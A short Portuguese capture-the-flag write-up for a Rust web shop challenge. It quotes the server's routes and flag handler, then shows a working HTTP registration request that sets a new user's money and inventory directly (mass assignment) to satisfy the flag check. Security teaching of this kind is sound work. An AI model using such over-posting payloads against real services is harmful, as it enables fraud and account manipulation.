# rustshop-writeup

## O Desafio
Rustshop é um app de loja online escrito em Rust (tanto front quanto backend) que permite criar usuários e comprar itens importantíssimos para qualquer usuário de Rust.

Felizmente o desafio fornece uma dica, dizendo que a vulnerabilidade está no código do servidor, então não precisamos nos preocupar com o código cliente.

Navegando pelo código do servidor, encontramos os seguintes endpoints:
```
pub fn router() -> Router {
    Router::new()
        .route("/user", get(user_get))
        .route("/register", post(register_post))
        .route("/login", post(login_post))
        .route("/items", get(items_get))
        .route("/buy", post(buy_post))
        .route("/flag", get(flag_get))
}
```

A flag é exposta em um endpoint, interessante... Analisando a função chamada por ele:
```
async fn flag_get(user: User) -> Json<APIResponse> {
    if user.money == 0x13371337 {
        for item in user.items {
            if item.name == "rustshop flag" && item.quantity == 0x42069 {
                return Json(APIResponse {
                    status: APIStatus::Success,
                    data: None,
                    message: Some(
                        env::var("FLAG").unwrap_or_else(|_| "flag{test_flag}".to_string()),
                    ),
                });
            }
        }
    }
    Json(APIResponse {
        status: APIStatus::Error,
        data: None,
        message: Some("no shot".to_string()),
    })
}
```
Precisamos de um usuário com dinheiro igual a 322376503 (decimal) e o item "rustshop flag" com quantidade 270441 (também decimal) no inventário para poder acessar a flag.

## Requisição
```
POST /api/register HTTP/1.1
Host: localhost:1337
content-type: application/json

[
  "username",
  "password",
  [["rustshop flag", 270441]],
  322376503
]
```
